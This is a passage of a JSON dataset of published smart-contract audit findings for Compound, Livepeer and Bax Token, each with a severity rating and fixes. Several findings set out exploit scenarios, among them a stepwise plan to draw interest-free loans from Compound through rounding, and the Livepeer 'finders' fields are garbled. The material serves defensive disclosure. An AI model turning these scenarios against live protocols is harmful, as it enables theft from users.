inherent to this error-handling pattern, it is a feature of the particular implementation we audited.\n* It does not cover every case, leading to inconsistencies within the code base. For example, the [`CEther` `mint` function](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CEther.sol#L34) reverts on failure, whereas the [`CErc20` `mint` function](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CErc20.sol#L48) returns an error code.\n* Finally, lack of a `revert` on failure is counter to what most Ethereum users have come to expect. For instance, a failed call to `CToken.transfer` via MetaMask will result in a `success` message from MetaMask even though the transfer failed. While this may not technically violate the ERC20 standard, it is counter-intuitive and increases the probability of user error.\n\n\nWith all of that said, it appears that all errors *are* properly handled in the code we audited. If considering a refactor of the contracts at some point in the future, we strongly recommend moving away from this error propagation pattern and instead using off-chain tools to evaluate failed transactions in order to display meaningful error messages to users.",
      "summary": "\nThis bug report discusses an error propagation mechanism used in a codebase. This mechanism works by returning a tuple with an error code and a value from a function that should return a value. This scheme has the benefit of providing useful failure messages when an operation fails, however, it violates the “Fail Early and Loudly” principle as errors are not trapped when they are found. Additionally, it increases the size and complexity of the codebase, resulting in increased gas costs. It also makes the code incompatible with battle-tested libraries and requires the use of custom math functions. Furthermore, the default assumption of the error handlers is that everything went according to plan, which is not safe. Finally, it does not cover every case, leading to inconsistencies within the codebase. The report concludes that all errors are properly handled in the code but recommends moving away from this error propagation pattern in the future and using off-chain tools to evaluate failed transactions in order to display meaningful error messages to users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11828",
      "title": "Outdated Interest Rates",
      "impact": "MEDIUM",
      "content": "In the `CToken` contract, [borrowRatePerBlock](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L410) and [supplyRatePerBlock](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L420) are supposed to return the current rates but they may be outdated. This is because those rates depend on variables that are updated when `accrueInterest` is called. Consider calling [`accrueInterest`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L597) at the beginning of these functions.",
      "summary": "\nThis bug report is about the `CToken` contract, a part of the Compound Protocol. The two functions, `borrowRatePerBlock` and `supplyRatePerBlock`, are meant to return the current rates, but they may be outdated. This is because they rely on variables that are updated when the `accrueInterest` function is called. To fix this issue, the `accrueInterest` function should be called at the beginning of the `borrowRatePerBlock` and `supplyRatePerBlock` functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11827",
      "title": "Incorrect Whitepaper Interest Rate",
      "impact": "MEDIUM",
      "content": "The [Compound Finance whitepaper](https://compound.finance/documents/Compound.Whitepaper.pdf) states in section 2.3:\n\n\n\n> \n>  The interest rate earned by suppliers is *implicit*, and is equal to the borrowing interest rate multiplied by the utilization rate.\n> \n> \n> \n\n\nIn fact, the [`supplyRatePerBlock` function](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L420) calculates it as the borrow interest rate multiplied by `borrowsPer` (which is not identical to the whitepaper utilization rate), and then multiplied again by (1 – the reserve factor). This is a related but not equivalent value to the specified one.\n\n\nConsider updating the whitepaper or the calculation for consistency.",
      "summary": "\nThis bug report is related to the Compound Finance whitepaper. The whitepaper states that the interest rate earned by suppliers is equal to the borrowing interest rate multiplied by the utilization rate. However, the `supplyRatePerBlock` function calculates it as the borrow interest rate multiplied by `borrowsPer` which is not identical to the whitepaper utilization rate. It is then multiplied again by (1 – the reserve factor). This is not equivalent to the value specified in the whitepaper. Therefore, it is suggested to update the whitepaper or the calculation for consistency.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11826",
      "title": "Interest May Not Compound",
      "impact": "MEDIUM",
      "content": "When calculating interest in [`CToken.accrueInterest()`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L597), simple interest is applied over the blocks since the last update. This will underestimate the amount of interest that would be calculated if it were compounded every block.\n\n\nThe code is designed to accrue interest as frequently as possible, but this requirement expands the responsibility of accruing interest into otherwise unrelated functions. Additionally, the size of the discrepancy between the computed and theoretical interest will depend on the volume of transactions being handled by the Compound protocol, which may change unpredictably.\n\n\nTo improve predictability and functional encapsulation, consider calculating interest with the compound interest formula, rather than simulating it through repeated transactions. Note that the additional gas requirements may be reduced using the [`modexp` precompile](https://medium.com/@rbkhmrcr/precompiles-solidity-e5d29bd428c4). Separately, consider measuring the time between calls to `accrueInterest()` using *seconds* rather than *blocks*. This will help keep the interest rate calculation robust against changes to the average blocktime.",
      "summary": "\nThe bug report is about the function `CToken.accrueInterest()` in the Compound Protocol, which currently applies simple interest over the blocks since the last update. This may underestimate the amount of interest that would be calculated if it were compounded every block. To improve predictability and functional encapsulation, the report suggests calculating interest with the compound interest formula and measuring the time between calls to `accrueInterest()` using seconds rather than blocks. This will help keep the interest rate calculation robust against changes to the average blocktime. Additionally, the size of the discrepancy between the computed and theoretical interest will depend on the volume of transactions being handled by the Compound protocol, which may change unpredictably. Finally, the report suggests using the `modexp` precompile to reduce the additional gas requirements.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11825",
      "title": "Counterproductive Incentives",
      "impact": "HIGH",
      "content": "The protocol includes a mechanism to incentivize arbitrageurs to repay loans that are under-collateralized. This should increase the borrower’s liquidity, reducing the risk of insolvency. After all, that is the point of the mechanism. However, there is a threshold where the incentives reverse and the liquidation mechanism actually pushes borrowers towards insolvency.\n\n\nConsider a borrower with cTokens in various markets worth a total of `C`, and total debt worth `D`. They are located at point (`D`, `C`) in the following diagram:\n\n\n![](https://i0.wp.com/blog.openzeppelin.com/wp-content/uploads/2019/08/diagram.jpg?resize=500%2C454&ssl=1)\n\n\nAfter accounting for the distribution of cTokens and their corresponding collateral factors (the fraction of cTokens that can be used as collateral in each market), we can assign them an effective collateral ratio (ECR). The maximum possible value is 90%, which is labeled on the diagram. It corresponds to the minimum possible slope for remaining in the collateralized region, which is `1 / 90% = 1.11`. With these values, we can describe the important regions:\n\n\n* Users in the green region above the ECR line are fully collateralized. They have enough collateral that even after reducing it by the ECR, it is still larger than their debt.\n* Users in the red region are insolvent. Their debt is larger than their collateral and they no longer have any incentive to repay it. Users in this region can be a major problem for the market because they continue accruing interest while removing liquidity from the market, ensuring at least some cToken holders will be unable to redeem their assets.\n* Users in the blue region are under-collateralized. They still have more assets than debt in the system, but the protocol deems them to be at risk of becoming insolvent.\n\n\nWhen a borrower is under-collateralized, anyone can repay some of their debt in exchange for collateral at better-than-market rates. This mechanism is parameterized by two global values that are set by the administrator:\n\n\n* the close factor: the maximum fraction of the original loan that can be liquidated\n* the liquidation incentive `L`: how much collateral do they receive (as a multiplier of the amount paid by the liquidator)\n\n\nThe Liquidation line on the diagram has slope `L` and passes through the origin. When an arbitrageur repays `x` debt, they receive `x*L` collateral from the borrower. In other words, they force the borrower to the bottom-left of the diagram on a trajectory parallel to the Liquidation line. The crucial observation is that this process can never cause a borrower to cross the liquidation line. Borrowers above the line are liquidated until they are fully collateralized, but borrowers below the line are actually pushed further towards insolvency by the liquidation process.\n\n\nIdeally, they would already be liquidated before they crossed the threshold, but this would depend on various factors outside of the protocol, such as the speed of price changes, the liveness of the oracle, the congestion of Ethereum and the responsiveness and liquidity of arbitrageurs.\n\n\nThe Compound system currently has a liquidation incentive of `1.05`, **which means that when a borrower’s debt rises to at least `1 / 1.05 = 95.2%` of the value of their cTokens, each liquidation will push them further towards insolvency**. The maximum amount that they can be liquidated in one transaction is bounded by the close factor. The current close factor in the Compound system is `0.5`, **which means that when a borrower’s debt rises to at least 97.6% of the value of their cTokens, it is possible for a liquidation to force them into insolvency**.\n\n\nConsider using a dynamic liquidation incentive that lowers as borrowers approach insolvency to ensure liquidations always increase solvency. Alternatively, consider treating the “incentivized insolvency” threshold of 95.2% as equivalent to insolvency, and choose the collateral factors and liquidation incentive accordingly.",
      "summary": "\nThe protocol includes a mechanism to incentivize arbitrageurs to repay loans that are under-collateralized in order to increase the borrower's liquidity and reduce the risk of insolvency. This is represented in the diagram where users above the Effective Collateral Ratio (ECR) line are fully collateralized, users below the line are insolvent, and users between the two are under-collateralized. Liquidations can occur when a borrower is under-collateralized, and the liquidator receives collateral from the borrower in exchange for repaying some of their debt. \n\nThe Compound system currently has a liquidation incentive of 1.05. This means that when a borrower's debt rises to at least 95.2% of the value of their cTokens, each liquidation will push them further towards insolvency. The maximum amount that they can be liquidated in one transaction is bounded by the close factor, which is currently 0.5. This means that when a borrower's debt rises to at least 97.6% of the value of their cTokens, it is possible for a liquidation to force them into insolvency. \n\nTo ensure liquidations always increase solvency, consider using a dynamic liquidation incentive that lowers as borrowers approach insolvency. Alternatively, consider treating the “incentivized insolvency” threshold of 95.2% as equivalent to insolvency, and choose the collateral factors and liquidation incentive accordingly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11824",
      "title": "Interest-Free Loans",
      "impact": "HIGH",
      "content": "The [`CToken` contract](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol) calculates the borrow balance of an account in the function [`borrowBalanceStoredInternal`](https://github.com/compound-finance/compound-protocol/blob/f385d71983ae5c5799faae9b2dfea43e5cf75262/contracts/CToken.sol#L481).\n\n\nThe balance is the principal scaled by the ratio of the borrow indices (which track the accumulative effect of per-block interest changes):\n\n\n`balance = principal * (current borrow index) / (original borrow index)`\n\n\nHowever, when the principal and ratio of borrow indices are both small the result can equal the principal, due to automatic truncation of division within solidity.\n\n\nThis means that a loan could accrue no actual interest, yet still be factored into calculations of `totalReserves`, `totalBorrows`, and `exchangeRates`. In the case of many small loans being taken out, the associated interest calculated for that market may not match the amount actually received when users pay off those loans.\n\n\nIn brief: it is possible for users to take out small, short-term, interest-free loans. Optionally, they can then resupply the borrowed assets back into Compound to receive interest.\n\n\nAn example attack works as follows:\n\n\n1. The attacker takes out several interest-free loans. By the nature of this vulnerability, these loans must be small. However, the attacker can take out arbitrarily many of them. It is most effective if the attacker borrows an asset for which the value of this truncation error is greatest (currently, wBTC).\n2. The attacker consolidates the small interest-free loans by sending all the borrowed assets to a single Ethereum account.\n3. (Optional) The attacker swaps the borrowed assets for an equal value of the highest-interest-rate asset on Compound (currently DAI).\n4. The attacker deposits the asset into Compound.\n5. (Optional) The attacker can then repeat the process — leveraging up — if they so desire.\n6. The attacker unwinds the trade and pays off all the small loans before the loans start “registering” interest (that is, before the interest owed is no longer “truncated away”). The result is that the attacker collects the supply-interest but does not have to pay the borrow-interest. Note that this is mathematically equivalent to the attacker simply stealing cash.\n7. Repeat.\n\n\nThere are a few practical considerations that make this attack non-trivial to pull off on the live network. These difficulties have to do with things unrelated to the Compound protocol: gas costs, slippage, and the unpredictable behavior of other Compound users. All of these can be overcome by certain classes of attackers, and we address them below.\n\n\nIn practice, steps 1, 2, and 6 of this process would be gas-intensive. So much so that the attack would not be profitable if the attacker has to pay a normal gas price. However, if the attacker is a miner then their gas price is zero, and so this attack costs them nothing in gas. (An exception is if the blocks are full, in which case the attacking miner must pay the opportunity cost of not filling the block with normal, paying transactions). Note that the miner does not need much mining power to do this. The ability to mine a couple of blocks per week is technically sufficient — though the more mining power they have, the more money they can borrow with no interest, and the more likely they are to be able to unwind the trade in time.\n\n\nAdditionally, if the attacker wants to get the most out of the attack, they’ll likely want to perform the optional step 3. This requires that they exchange one asset for another on the open market. Here they may incur fees and/or slippage as they sell one asset for another. If fees and/or slippage are greater than the profit they make on their short-term, interest-free loan, then the attack is not profitable. This limits the attackers to those that can make trades very cheaply (or to those who are willing to forgo step 3 and accept a smaller rate of return).\n\n\nFinally, the attacker may be foiled if other users of Compound borrow more of the same asset the attacker did — thus driving the borrow interest rate up and causing the attacker’s owed interest to unexpectedly rise above the level at which it would be “truncated away”. An attacker has two ways to mitigate this risk. First, they can borrow smaller amounts to give themselves some “cushion” just in case the interest rate on their borrow rises. Second, they can choose to only go long on assets where they would be okay paying the interest anyway. That way, if the attack fails, they end up in the same position as anyone else going long on that asset — and if the attack succeeds, then they get the added bonus of not having to pay interest for the assets they used for leverage.\n\n\nIn short, there exists unavoidable error when computing interest. However, there does exist a choice over who gets the benefit of that error. The error should always be handled in a way that benefits the cToken contract, not the borrower. The small rounding error in favor of the borrower (and at the expense of the cToken contract) can be scaled up to eventually steal arbitrarily large sums of money from the cToken contract.\n\n\nConsider adjusting the code such that the calculated borrow balance is always rounded *up* instead of being truncated.",
      "summary": "\nA bug has been reported in the `CToken` contract, which is part of the Compound Protocol. This bug allows users to take out small, short-term, interest-free loans. This happens when the principal and ratio of borrow indices are both small, as the result of automatic truncation of division within solidity. This means that the associated interest calculated for that market may not match the amount actually received when users pay off those loans. \n\nAn example attack works as follows: the attacker takes out several interest-free loans, consolidates them, optionally swaps the borrowed assets for an equal value of the highest-interest-rate asset on Compound, deposits the asset into Compound, then unwinds the trade and pays off all the small loans before the loans start “registering” interest. If the attacker is a miner, then the attack costs them nothing in gas. If the attacker is not a miner, they must pay a normal gas price. The attacker may also incur fees and/or slippage when exchanging assets on the open market. The attacker may also be foiled if other users of Compound borrow more of the same asset the attacker did, driving the borrow interest rate up.\n\nThe bug should be fixed by adjusting the code such that the calculated borrow balance is always rounded up instead of being truncated. This will ensure that the error is handled in a way that benefits the cToken contract, not the borrower.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Audit",
      "source_link": "https://blog.openzeppelin.com/compound-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "17049",
      "title": "Bonding synchronization errors between data structures can enable stolen and locked tokens",
      "impact": "LOW",
      "content": "## Description\n\nDelegated stake is stored in two different data structures. If the data structures ever get out of sync, delegates will be able to claim earnings that are not owed to them, artificially reduce transcoders’ bonded stake, and lock other delegates’ tokens and bonding ability. This is because certain bonding checks validate against one data structure, while others validate against the other.\n\nDelegated stake is stored in two different data structures within the Bonding Manager: `delegators` and `transcoderPool`. The former maps delegators’ bonded stake to their delegates, while the keys of the latter store the sums of the delegated stake for the transcoders. If there is any way to break the synchronization between these data structures—such that the transcoder stake summations in `transcoderPool` are erroneous—then delegators would be able to remove stake from transcoders. When a delegator re-bonds to a new address or unbonds itself completely, if at that time its old delegated stake is for a registered transcoder, then its stake will be subtracted from that transcoder’s key in `transcoderPool` according to the value in `delegators`.\n\n```solidity\nif (transcoderStatus(del.delegateAddress) == TranscoderStatus.Registered) {\n    // Previously delegated to a transcoder\n    // Decrease old transcoder's total stake\n    transcoderPool.updateKey(\n        del.delegateAddress,\n        transcoderPool.getKey(del.delegateAddress).sub(del.bondedAmount),\n        address(0), address(0)\n    );\n}\n```\n\nFigure 5: Transcoder stake deletion in BondingManager.sol\n\nThe eligibility to claim earnings is based off of a delegator’s `delegateAddress` in the `delegators` data structure, but the actual earnings calculation is based off of the delegated amount in the `transcoderPool` data structure. Moreover, if the erroneously reduced stake is sufficiently high, it can lock other delegators’ stakes to that transcoder, as is demonstrated by the following exploit scenario. Finally, if the original delegator claims earnings before any other delegators bonded to the same transcoder—which will automatically happen when the transcoder either unbonds or re-bonds—then the original delegator will receive earnings intended for the other delegators since the rewards pool did not take into account the original phantom stake. When the other delegators subsequently attempt to claim earnings, a SafeMath assertion will fail when each delegator attempts to subtract their claims from the earnings pool, effectively locking their earnings and preventing the delegator from ever unbonding.\n\n**Note:** The severity of this finding is classified as “Informational” because we were not able to exploit it. Therefore, it does not pose any immediate security risk. However, a future modification to the Bonding Manager contract could easily expose it.\n\n## Exploit Scenario\n\nAlice wants to reduce the stake of Bob’s transcoder. Alice has bonded 1,337 delegated stake to Bob’s transcoder, Bob has bonded 1,000 of his own stake, and Carol has also bonded 2,000 stake to Bob’s transcoder.\n\nAssume that a synchronization error does exist that prevented Alice’s 1,337 stake from appearing in the `transcoderPool` data structure. Therefore, from the perspective of the `transcoderPool`, Bob’s transcoder will only have 3,000 bonded stake, not the correct amount: 4,337.\n\n## Malicious Delegator Can Claim Additional Earnings\n\nAs long as Alice claims her earnings for Bob’s transcoder’s claimed work relatively early, she will get an undue increase in her reward. This is because the earnings pool’s claimable stake is based off of the erroneous basis of 3,000 bonded stake. Therefore, Alice will receive \\( \\frac{1,337}{3,000} \\approx 45\\% \\) of the reward pool instead of \\( \\frac{1,337}{4,337} \\approx 31\\% \\) that she actually deserves.\n\n## Malicious Delegator Can Artificially Reduce Transcoders’ Bonded Stake\n\nAlice eventually re-bonds her stake to a different address or alternatively un-bonds herself completely. This automatically calls `claimEarnings`, which will once again give Alice an undue share of the rewards. After Alice completes her bonding change, Bob’s transcoder’s address in the `transcoderPool` data structure will have its bonded amount reduced by Alice’s 1,337, resulting in an erroneous bonded stake of 1,663.\n\n## Other Delegators’ Bonded Tokens Can Be Locked\n\nCarol decides to re-bond to a different transcoder. However, she will be unable to because the claimable stake in the earnings pool is less than Carol’s stake of 2,000, causing an assertion error in `autoClaimEarnings`. Even if that were not the case, the safe subtraction in Figure 4 would also fail an assertion because `del.bondedAmount = 2000`, but Bob’s transcoder’s value in the `transcoderPool` is currently 1,663. This effectively locks Carol’s delegated stake, preventing her from unbonding, re-bonding, or claiming her stake.\n\n## Recommendation\n\n- Improve source code comments to provide better context for the interdependency between data structures and their semantics.\n- Consider improving the automated integration tests to check for bonding edge cases.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Livepeer",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/livepeer.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "2018: March 12",
        "Changelog March 9",
        "Evan Sultanik",
        "Chris Evans",
        "2018: March 10",
        "2018: Initial report delivered Added informational ﬁnding TOB-Livepeer-005 Public release © 2018 Trail of Bits Livepeer Security Assessment | 1"
      ]
    },
    {
      "id": "17048",
      "title": "Transcoders with low bonded stake can avoid slashing penalties",
      "impact": "LOW",
      "content": "## Denial of Service\n\n## Targets\n- **BondingManager.sol**\n- **EarningsPool.sol**\n\n## Difficulty\n- Undetermined\n\n## Description\nWhen a transcoder is slashed, the Job Manager sets a percentage of the bonded delegated stake to burn as a penalty. This is passed into `slashTranscoder` as `_slashAmount`. Based on this parameter, there will always be a maximum `n` number bounded stake that will not be burned for a `_slashAmount` of `PERC_DIVSOR/n + 1`.\n\n```solidity\nfunction slashTranscoder(\n    address _transcoder,\n    address _finder,\n    uint256 _slashAmount,\n    uint256 _finderFee\n) external whenSystemNotPaused onlyJobsManager {\n    Delegator storage del = delegators[_transcoder];\n    if (del.bondedAmount > 0) {\n        uint256 penalty = MathUtils.percOf(delegators[_transcoder].bondedAmount, _slashAmount);\n        // Decrease bonded stake\n        del.bondedAmount = del.bondedAmount.sub(penalty);\n```\n\n**Figure 4:** Penalty calculation does not check for 0.\n\nSlashed transcoders will be ejected from the registered pool. Since the bonded stake is neither subtracted nor burned, it remains available and can be withdrawn or rebonded to a different address.\n\n## Exploit Scenario\nAlice registers transcoders on the Livepeer network that adjust their bonded stake to match the minimum tokens that cannot be penalized. As long as they remain in the transcoder pool, there is a pseudo-random chance for them to be selected and claim work. If they are penalized when selected for verification, Alice can re-register or withdraw the bonded stake and reintroduce a new transcoder into the pool.\n\n## Recommendation\nSubtract the total amount of bonded stake if the penalty is 0 but `delegators[_transcoder].bondedAmount` is > 0. Alternatively, have a minimum penalty value and take the maximum between this and the calculated penalty.\n\nIn the long term, have integration tests that ensure penalized participants cannot evade the deterrent. In addition, awarding finders’ fees for users’ participation in slashing will incentivize abuse by malicious actors. Ensure that internal tests reflect scenarios in which transcoders may be unfairly reported.\n\n## References\n- When a transcoder is slashed, the Job Manager sets a percentage of the bonded delegated stake to burn as a penalty via the `setMissedVerificationSlashAmount` and `setDoubleClaimSegmentSlashAmount` functions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Livepeer",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/livepeer.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "2018: March 12",
        "Changelog March 9",
        "Evan Sultanik",
        "Chris Evans",
        "2018: March 10",
        "2018: Initial report delivered Added informational ﬁnding TOB-Livepeer-005 Public release © 2018 Trail of Bits Livepeer Security Assessment | 1"
      ]
    },
    {
      "id": "17047",
      "title": "Pseudorandom number generation is not random",
      "impact": "LOW",
      "content": "## Type: Arithmetic  \n**Target:** BondingManager.sol  \n\n**Difficulty:** Low  \n\n## Description  \nTranscoder assignment elections are not fair. The PRNG scheme is not uniformly distributed. The problem is that pseudorandom numbers are generated by taking a block hash modulus with an arbitrary sum of the bonded transcoder stakes. This will not produce a pseudorandom number. Specifically, the distribution of the randomly generated value is not guaranteed to be uniform across all active transcoders.\n\nFigure 3 is a plot of the frequency of transcoders being elected from a pool of 100 transcoders across 10,000 elections with all transcoders having equal stake. The red line is the result of a fair election produced by a cryptographically secure PRNG, while the blue line is the result of the Livepeer election.\n\n**Figure 3:** Red is a cryptographically secure PRNG, blue is the Livepeer PRNG.  \nThe X axis contains one bucket for each of the 100 transcoders, ordered by their index in the active transcoder set. The Y axis is the percentage of the elections in which each of the 100 transcoders were elected. As expected, the fair election results in each transcoder having a 1% probability of winning. However, the Livepeer contract election produces a very unfair distribution that is dependent on the transcoder’s position in the active transcoder set, with some transcoders having over a 60% advantage relative to others.  \n\n## Exploit Scenario  \nA malicious transcoder registers itself to be active at such a time that it is ensured to be in a position within `activeTranscoderSet` that maximizes its probability of being selected.  \n\n## Recommendation  \nDo not use block hashes as a source of randomness.  \nAn alternative might be to have some deterministic metric for which transcoder to select, such as the time since it was last selected weighted by its bonded stake.  \nIf randomness must be used and an external source of randomness is not available, then use the block hash to seed an accepted pseudorandom number generation algorithm that is guaranteed to produce a uniform distribution. Such a solution will produce a fairer election, but it will not mitigate prediction attacks like TOB-Livepeer-001.  \n\n## References  \n- Appendix E: Pseudorandom number generation in smart contracts",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Livepeer",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/livepeer.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "2018: March 12",
        "Changelog March 9",
        "Evan Sultanik",
        "Chris Evans",
        "2018: March 10",
        "2018: Initial report delivered Added informational ﬁnding TOB-Livepeer-005 Public release © 2018 Trail of Bits Livepeer Security Assessment | 1"
      ]
    },
    {
      "id": "17046",
      "title": "Loss of precision for su�ﬁciently high denominator and amount",
      "impact": "LOW",
      "content": "## Cryptography Assessment: BondingManager.sol\n\n## Difficulty\nHigh\n\n## Description\nWhen using `MathUtils.percOf(amount, fracNum, fracDenom)`, if the amount is large enough where the fractional percentage is outside the precision range of the `PERC_DIVISOR` constant, then the returned value will always round down to 0.\n\n### Function Definitions\n\n```solidity\n/*\n* @dev Compute percentage of a value with the percentage represented by a fraction\n* @param _amount Amount to take the percentage of\n* @param _fracNum Numerator of fraction representing the percentage\n* @param _fracDenom Denominator of fraction representing the percentage\n*/\nfunction percOf(uint256 _amount, uint256 _fracNum, uint256 _fracDenom) internal pure returns (uint256) {\n    return _amount.mul(percPoints(_fracNum, _fracDenom)).div(PERC_DIVISOR);\n}\n\n/*\n* @dev Compute percentage representation of a fraction\n* @param _fracNum Numerator of fraction representing the percentage\n* @param _fracDenom Denominator of fraction representing the percentage\n*/\nfunction percPoints(uint256 _fracNum, uint256 _fracDenom) internal pure returns (uint256) {\n    return _fracNum.mul(PERC_DIVISOR).div(_fracDenom);\n}\n```\n\n### Figure 2: Susceptible Functions in MathUtils.sol\n\nConsider the scenario where a user attempts to calculate a fractional percentage point of a large value:\n\n- `fracNum = 1`\n- `fracDenom = PERC_DIVIDER + 1`\n- `amount = 25000000`\n\n`MathUtils.percPoints` will return 0, causing the resulting quotient to always be 0, while in this case the actual value is closer to 249. Since this level of precision may be outside of the required ceiling for Livepeer, and these functions are mostly used internally, the finding is classified as informational.\n\n## Exploit Scenario\nAlice deploys a smart contract to handle participation in the Livepeer network. She imports `MathUtils.sol` to evaluate calculative logic for her own transactions, perhaps involving wei and gas costs. Zero results in some cases cause her to lose money or make suboptimal decisions, leading her to withdraw her participation.\n\n## Recommendation\nRequire `MathUtils.validPerc` to verify that the product of `fracNum.mul(PERC_DIVISOR)` is less than `fracDenom`. \n\nIn the long term, examine the use cases for fixed-point arithmetic and include clear documentation for the limits and restrictions for calling into these functions. Enumerate rounding decisions and scenarios that would result in a loss of precision.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Livepeer",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/livepeer.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "2018: March 12",
        "Changelog March 9",
        "Evan Sultanik",
        "Chris Evans",
        "2018: March 10",
        "2018: Initial report delivered Added informational ﬁnding TOB-Livepeer-005 Public release © 2018 Trail of Bits Livepeer Security Assessment | 1"
      ]
    },
    {
      "id": "17045",
      "title": "Transcoder election can be predictable and in�luenced",
      "impact": "LOW",
      "content": "## Type: Arithmetic\n**Target:** MathUtils.sol\n\n## Type: Denial of Service\n**Target:** BondingManager.sol\n\n## Description\nA malicious miner can influence the election by manipulating the job-creation block to achieve a desired hash, or simply by choosing not to publish a block that would favor an undesirable transcoder. When a transcoder is claiming work, the JobsManager first ensures that the transcoder won the election. This is determined by confirming that:\n\n1. The transcoder is active; and\n2. The hash of the job’s creation block, modulus the total stake among active transcoders, results in stake assigned to the claimant.\n\n```solidity\n// Pseudorandomly pick an available transcoder weighted by its stake relative\n// to the total stake of all available transcoders\nuint256 r  =  uint256(_blockHash)  %  totalAvailableTranscoderStake;\nuint256 s  =   0 ;\nuint256 j  =   0 ;\nwhile  (s  <=  r  &&  j  <  numAvailableTranscoders) {\n    s  =  s.add(activeTranscoderTotalStake(availableTranscoders[j], _round));\n    j++ ;\n}\nreturn  availableTranscoders[j  -   1];\n```\n\n**Figure 1:** Election Assignment Block in BondingManager.sol\n\nThe Livepeer protocol specification does note that a transcoder can launch a self-dealing attack similar to the one described above if it is also an Ethereum miner.\n\n## Exploit Scenario\nA malicious transcoder manipulates the hash of a job-creation block (e.g., by transaction reordering or injecting spurious transactions) such that its desired transcoder wins the election.\n\n## Recommendation\nThere does not appear to be a resolution to this issue without changing the Livepeer protocol. An external source of randomness for the transcoder election would resolve this issue. While Livepeer is aware of this issue, we report it here in order to urge Livepeer to use a different, more secure, and fairer means of electing transcoders.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Livepeer",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/livepeer.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "2018: March 12",
        "Changelog March 9",
        "Evan Sultanik",
        "Chris Evans",
        "2018: March 10",
        "2018: Initial report delivered Added informational ﬁnding TOB-Livepeer-005 Public release © 2018 Trail of Bits Livepeer Security Assessment | 1"
      ]
    },
    {
      "id": "11936",
      "title": "Lack of integration tests",
      "impact": "LOW",
      "content": "The [`BaxToken`](https://github.com/FintechServer/baxtoken/blob/3ba88dd8fb3a97e6668cf2029b38610283e28c17/contracts/BaxToken.sol) makes use of the [`BurnableToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.5.0/contracts/token/BurnableToken.sol) and [`CappedToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.5.0/contracts/token/CappedToken.sol) contracts of the OpenZeppelin framework. Although there are unit tests ensuring their correct behavior within the OpenZeppelin repository, there is no integration test to ensure the `BaxToken` behaves the way it is expected.  \n\nConsider adding integration tests to check `BaxToken` behavior and initialization.  \n\n***Update**: Fixed in commit [`ea5268b`](https://github.com/FintechServer/baxtoken/commit/ea5268b78a839c156398badf319018ef7c17cbf2).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Bax Token Audit",
      "source_link": "https://blog.openzeppelin.com/bax-token-audit-85fe7b186c89/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11944",
      "title": "Solidity version",
